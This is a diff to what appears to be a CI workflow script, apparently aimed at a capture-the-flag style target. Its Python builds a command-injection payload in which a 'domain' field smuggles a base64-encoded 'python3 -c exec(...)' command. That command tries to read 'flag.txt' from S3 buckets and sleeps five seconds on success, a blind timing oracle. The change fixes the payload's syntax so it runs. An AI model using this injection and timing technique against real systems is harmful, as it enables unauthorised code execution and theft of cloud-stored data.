@@ -41,14 +41,14 @@ jobs:
           auth = AWS4Auth(os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"], "us-east-1", "execute-api", session_token=os.environ["AWS_SESSION_TOKEN"])
           results = {}
           for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
-              code = (
-                  "import boto3,time;"
-                  "try:"
-                  " s=boto3.client('s3',region_name='us-east-1',endpoint_url='https://s3.us-east-1.amazonaws.com');"
-                  f" s.get_object(Bucket={bucket!r},Key='flag.txt')['Body'].read();"
-                  " time.sleep(5)"
-                  "except Exception: pass"
-              )
+              code = f"""import boto3, time
+          try:
+              s = boto3.client('s3', region_name='us-east-1', endpoint_url='https://s3.us-east-1.amazonaws.com')
+              s.get_object(Bucket={bucket!r}, Key='flag.txt')['Body'].read()
+              time.sleep(5)
+          except Exception:
+              pass
+          """
               encoded = base64.b64encode(code.encode()).decode()
               domain = 'example.com; python3 -c "import base64;exec(base64.b64decode(\'' + encoded + '\'))"'
               start = time.monotonic()
